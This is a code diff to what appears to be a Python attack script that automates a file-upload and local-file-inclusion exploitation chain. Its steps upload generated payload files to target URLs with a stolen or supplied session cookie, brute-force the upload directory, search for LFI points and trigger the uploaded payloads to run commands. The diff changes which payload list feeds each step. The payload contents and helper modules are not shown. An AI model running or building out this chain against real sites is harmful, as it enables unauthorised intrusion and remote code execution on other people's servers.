@@ -110,14 +110,14 @@ def main():
         exit(1)
 
     # 🔹 Step 4: Combine payload lists
-    payload_filenames = PAYLOAD_FILENAMES + generated_payloads
+    # payload_filenames = PAYLOAD_FILENAMES + generated_payloads
 
     # 🔹 Step 5: Try Uploading Each Payload
     uploaded_files = []
     failed_files = []
 
     for url in uploadable_urls:
-        for payload in payload_filenames:
+        for payload in generated_payloads:
             if uploadv2.upload_file(url, payload, COOKIE, CONTENT_TYPE_FILE):
                 print(f"[+] File uploaded successfully: {payload} -> {url}")
                 uploaded_files.append(url + "/" + payload)
@@ -126,7 +126,7 @@ def main():
 
     # 🔹 Step 6: Detect upload directory
     dynamic_upload_dir = uploadv2.get_upload_directory(
-        URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAMES, COOKIE
+        URL, UPLOAD_DIR_WORDLIST, uploaded_files, COOKIE
     )
 
     if not uploaded_files:
@@ -138,15 +138,14 @@ def main():
         print(f"[+] Detected Upload Directory: {dynamic_upload_dir}")
     else:
         print("[-] No valid upload directory found. Exiting.")
-        generate_report(uploaded_files, failed_files, [])
+        # generate_report(uploaded_files, failed_files, [])
         #exit(1)
 
     # 🔹 Step 7: Test execution
     executed_files = []
     for target in lfi_targets:
-        lfi_found_url = lfi.brute_force_lfi(
-            target, dynamic_upload_dir + PAYLOAD_FILENAMES, session, COOKIE
-        )
+        lfi_found_url = lfi.brute_force_lfi(target, uploaded_files, session, COOKIE)
+        
         if lfi_found_url:
             print(f"[+] LFI Found at: {lfi_found_url}")
             command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
